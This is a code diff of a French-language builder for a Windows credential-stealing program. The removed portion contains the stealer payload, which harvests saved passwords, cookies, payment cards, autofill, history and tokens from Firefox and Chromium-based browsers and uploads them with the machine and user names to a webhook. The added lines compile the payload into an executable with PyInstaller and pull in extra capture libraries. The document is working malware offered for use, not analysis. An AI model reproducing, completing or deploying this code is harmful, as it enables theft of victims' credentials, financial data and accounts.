-        except:pass
-    def grab_firefox_passwords(self,profile_path):
-        logins_path=os.path.join(profile_path,'logins.json')
-        if not os.path.exists(logins_path):return
-        try:
-            with open(logins_path,'r',encoding='utf-8')as f:logins_data=json.load(f)
-            for login in logins_data.get('logins',[]):
-                self.data['passwords'].append({'browser':'Firefox','url':login.get('hostname',''),'username':login.get('encryptedUsername',''),'password':login.get('encryptedPassword','')})
-                self.stats['total_passwords']+=1
-        except:pass
-    def grab_all_browsers(self):
-        for browser_name,browser_info in self.browsers.items():
-            browser_path=browser_info['path']
-            if not os.path.exists(browser_path):continue
-            self.stats['browsers_found']+=1
-            if browser_name=='Firefox':
-                for profile_dir in os.listdir(browser_path):
-                    profile_path=os.path.join(browser_path,profile_dir)
-                    if os.path.isdir(profile_path):
-                        self.stats['profiles_scanned']+=1
-                        self.grab_firefox_cookies(profile_path)
-                        self.grab_firefox_passwords(profile_path)
-            else:
-                for profile_name in browser_info['profiles']:
-                    if profile_name:profile_path=os.path.join(browser_path,profile_name)
-                    else:profile_path=browser_path
-                    if not os.path.exists(profile_path):continue
-                    self.stats['profiles_scanned']+=1
-                    self.grab_chromium_cookies(browser_name,profile_path)
-                    self.grab_chromium_passwords(browser_name,profile_path)
-                    self.grab_chromium_cards(browser_name,profile_path)
-                    self.grab_chromium_autofill(browser_name,profile_path)
-                    self.grab_chromium_history(browser_name,profile_path)
-                    self.grab_chromium_tokens(browser_name,profile_path)
-    def create_compact_report(self):
-        report={'session_id':self.session_id,'date':datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'pc':os.environ.get('COMPUTERNAME','Unknown'),'user':os.environ.get('USERNAME','Unknown'),'stats':self.stats,'data':{'cookies':self.data['cookies'][:300],'passwords':self.data['passwords'],'cards':self.data['cards'],'tokens':self.data['tokens']}}
-        return report
-    def send_optimized(self):
-        try:
-            time.sleep(2)
-            report=self.create_compact_report()
-            temp_dir=os.environ.get('TEMP','')
-            json_file=os.path.join(temp_dir,f'data_{self.session_id}.json')
-            with open(json_file,'w',encoding='utf-8')as f:json.dump(report,f,separators=(',',':'),ensure_ascii=False)
-            zip_buffer=io.BytesIO()
-            with zipfile.ZipFile(zip_buffer,'w',zipfile.ZIP_DEFLATED,compresslevel=9)as zip_file:zip_file.write(json_file,'data.json')
-            zip_buffer.seek(0)
-            file_size_kb=len(zip_buffer.getvalue())/1024
-            webhook_url="WEBHOOK_URL_PLACEHOLDER"
-            if file_size_kb<50:description=f"Session {self.session_id}"
-            else:description=f"Large dataset - {file_size_kb:.1f}KB"
-            embed={"embeds":[{"description":description,"color":0x2ecc71,"fields":[{"name":"PC","value":f"`{report['pc']}`","inline":True},{"name":"User","value":f"`{report['user']}`","inline":True},{"name":"Browsers","value":str(self.stats['browsers_found']),"inline":True},{"name":"Cookies","value":str(self.stats['total_cookies']),"inline":True},{"name":"Passwords","value":str(self.stats['total_passwords']),"inline":True},{"name":"Cards","value":str(self.stats['total_cards']),"inline":True}],"footer":{"text":f"ID: {self.session_id}"},"timestamp":datetime.utcnow().isoformat()}]}
-            files={'file':(f'{self.session_id}.zip',zip_buffer,'application/zip')}
-            data={'payload_json':json.dumps(embed,separators=(',',':'))}
-            headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-            response=requests.post(webhook_url,files=files,data=data,headers=headers,timeout=45)
-            if response.status_code==429:
-                retry_after=int(response.json().get('retry_after',5))
-                time.sleep(retry_after+1)
-                requests.post(webhook_url,files={'file':(f'{self.session_id}.zip',zip_buffer,'application/zip')},data=data,headers=headers,timeout=45)
-            os.remove(json_file)
-        except Exception as e:pass
-    def run(self):
-        try:
-            self.grab_all_browsers()
-            self.send_optimized()
-        except:pass
-def main():
-    try:
-        stealer=AntiBanStealer()
-        stealer.run()
-    except:pass
-if __name__=="__main__":main()'''
-    
-    c = payload_code.replace('WEBHOOK_URL_PLACEHOLDER', '{webhook_url}')
+    c = PAYLOAD_CODE.replace('YOUR_WEBHOOK_URL_HERE', w)
     
     os.makedirs('output', exist_ok=True)
     t = f'output/{n}_temp.py'
@@ -362,15 +788,13 @@ if __name__=="__main__":main()'''
     Write(Colorate.Horizontal(Colors.green_to_cyan, 'Creation du payload...\n'))
     
     with open(t, 'w', encoding='utf-8') as f:
-        f.write(c.replace('{webhook_url}', w))
-    
-    set_file_attributes(t)
+        f.write(c)
     
     Write(Colorate.Horizontal(Colors.green_to_cyan, 'Compilation en cours...\n'))
     
     if subprocess.run(['pyinstaller', '--version'], capture_output=True).returncode != 0:
         Write(Colorate.Horizontal(Colors.green_to_cyan, '\nPyInstaller non installe!\n'))
-        Write(Colorate.Horizontal(Colors.green_to_cyan, '   pip install pyinstaller\n'))
+        Write(Colorate.Horizontal(Colors.green_to_cyan, 'Installez avec: pip install pyinstaller\n'))
         sys.exit()
     
     r = subprocess.run([
@@ -381,6 +805,11 @@ if __name__=="__main__":main()'''
         '--hidden-import', 'cryptography',
         '--hidden-import', 'cryptography.hazmat.primitives.ciphers.aead',
         '--hidden-import', 'win32crypt',
+        '--hidden-import', 'psutil',
+        '--hidden-import', 'PIL',
+        '--hidden-import', 'cv2',
+        '--collect-all', 'PIL',
+        '--collect-all', 'cv2',
         '--noconfirm',
         '--clean',
         t
@@ -404,7 +833,9 @@ if __name__=="__main__":main()'''
     Write(Colorate.Horizontal(Colors.green_to_cyan, Center.XCenter(success_banner)))
     print("\n")
     Write(Colorate.Horizontal(Colors.green_to_cyan, f"Fichier : output/{n}.exe\n"))
+    Write(Colorate.Horizontal(Colors.green_to_cyan, f"Webhook : {w[:50]}...\n"))
     print()
 
 if __name__ == "__main__":
     main()
+
